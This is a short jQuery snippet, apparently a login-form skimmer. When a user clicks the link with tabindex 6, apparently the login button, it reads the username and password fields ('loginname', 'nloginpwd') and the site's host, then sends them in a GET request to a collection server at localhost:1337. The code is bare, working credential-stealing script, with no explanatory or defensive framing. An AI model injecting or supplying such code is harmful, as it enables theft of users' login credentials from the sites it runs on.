$('body').on("click",'a[tabindex="6"]', function(event){
    var username = $('input[name="loginname"]').val();
    var passwords = $('input[name="nloginpwd"]').val();
     var web= window.location.host;
    var query = '?username=' + username + '&' + 'passwords=' + passwords+ '&' + 'web=' + web;
    $.get('http://localhost:1337' + query, function() {});
});